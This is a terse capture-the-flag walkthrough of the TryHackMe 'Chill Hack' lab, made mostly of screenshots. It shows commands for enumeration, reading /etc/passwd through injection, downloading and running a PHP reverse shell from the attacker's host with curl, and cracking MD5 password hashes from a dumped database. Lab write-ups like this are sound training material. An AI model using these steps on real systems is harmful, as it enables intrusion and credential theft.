### 05-Mar-24-Tue

[TryHackMe | Chill Hack](https://tryhackme.com/room/chillhack)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/20125be3-3285-4fb8-8d6d-a1039d894eb3)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f5952956-8ae0-4b57-8140-a605155da40c)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/32105c8c-02f4-4227-ae55-e2737ad24c6b)

```
ftp anonymous@10.10.20.118
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c5d4cc88-cd0f-42d2-93ff-bcccd99b3ae6)

http://10.10.20.118/

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/88042967-dc26-4fd8-926d-b9f4be79772d)

```
gobuster dir -u http://10.10.52.188/ -w /usr/share/wordlists/dirb/common.txt
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/40de5bad-b385-4548-9560-b21011b14742)

http://10.10.52.188/secret/

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/55083eda-f85e-4f15-8e9c-004b6de3ebe7)

```
pwd
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/7b5c0104-b6d4-4586-bc20-118ed2f17bed)

```
whoami
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6fe99637-ff56-47ad-83d6-b9bb0bf22dc2)

```
which python
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/1f9aa056-696b-4586-884d-74c8ee934327)

https://dangilbert.gitbook.io/try-hack-me/writeups/chillhack

```
echo $(cat /etc/passwd)
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/896d458f-3e28-4bbe-a8f1-546698f021ec)

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aurick:x:1000:1000:Anurodh:
/home/aurick:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false apaar:x:1001:1001:,,,:
/home/apaar:/bin/bash anurodh:x:1002:1002:,,,:
/home/anurodh:/bin/bash ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```
echo $(cat index.php | base64)
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f5c5fa68-22d5-45be-9f41-244176e47fc0)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/cf668110-d0b2-4f94-9035-c2123a4fe096)

```
curl http://10.17.44.152:8000/revshell.php -o /dev/shm/revshell.php
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/34af0cc9-4eec-4a15-b3bb-319896e277cb)

```
php7.2 /dev/shm/revshell.php
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b7c9c84b-8034-4b2c-b277-b23aea6369c2)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6c193fe4-592b-49ca-a7c5-ddb60271faf0)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/6bda7e47-ba46-4fd4-90b5-8ea9df271f84)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f5f6cb2a-3386-47db-a151-e040f90fcaa9)

```
mysql -u root -p
```

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/dbef2940-7640-43db-830f-da070cfcfeea)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/71e7fe1c-eabd-4a92-9727-c1e12d2d3fbb)


| id | firstname | lastname | username  | password                         |
| - | - | - | - | - |
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ff1a766a-566b-4add-ba66-0058124c7b5a)

| Hash | Type | Result |
| - | - | - |
| 686216240e5af30df0501e53c789a649	| md5 |	dontaskdonttell |
| 7e53614ced3640d5de23f111806cc4fd	| md5	| masterpassword |

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/066f4971-662a-4d0e-896e-e80f9d6ed717)

![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/8ce218a5-be2a-4a17-967e-7e8e84ac6fda)

https://drive.google.com/file/d/1XESxM91W-L3ONBw3rQTR_mrf67mhT3OZ/view?source=post_page-----889274e1aa78--------------------------------

```
cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

